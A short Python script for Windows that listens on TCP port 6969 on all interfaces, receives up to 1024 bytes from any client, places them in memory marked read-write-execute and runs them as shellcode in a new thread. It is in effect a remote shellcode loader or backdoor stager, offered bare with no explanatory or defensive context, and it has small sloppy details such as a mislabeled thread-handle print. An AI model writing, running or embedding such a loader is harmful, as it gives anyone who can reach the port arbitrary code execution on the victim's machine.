import ctypes
import socket

def execute_shellcode(shellcode):
    print( "Executing (%i bytes) : " % len(shellcode), end="" )
    print(shellcode)

    MEM_COMMIT = 0x00001000
    MEM_RESERVE= 0x00002000

    PAGE_EXECUTE_READWRITE = 0x40

    #
    # Allocate some executable memory to execute the shellcode from.
    #
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    executable_memory = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                            ctypes.c_int(len(shellcode)),
                                                            ctypes.c_int(MEM_COMMIT|MEM_RESERVE),
                                                            ctypes.c_int(PAGE_EXECUTE_READWRITE))
 
    native_buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
    print( "Allocated shellcode at: 0x%016X" % executable_memory )
    
    #
    # Write the shellcode to the executable_memory.
    #
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(executable_memory),
                                         native_buffer,
                                         ctypes.c_int(len(shellcode)))
    
    #
    # Execute it by creating a thread on it.
    #
    thread_handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                        ctypes.c_int(0),
                                                        ctypes.c_void_p(executable_memory),
                                                        ctypes.c_int(0),
                                                        ctypes.c_int(0),
                                                        ctypes.pointer(ctypes.c_int(0)))
    
    print( "Thread created (handle: %x)" % executable_memory )

    print("Waiting for thread exit")
    
    #
    # Wait untill its finished executing.
    #
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread_handle), ctypes.c_int(-1))

    print("Shell code finished now exiting...")


IP = "0.0.0.0"
PORT = 6969

socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s = socket.create_server((IP, PORT))
print("Listening on %s:%i" % (IP, PORT))

connection, address = s.accept()

shellcode = connection.recv(1024)
execute_shellcode(bytearray(shellcode))

s.close()        

while True:
    pass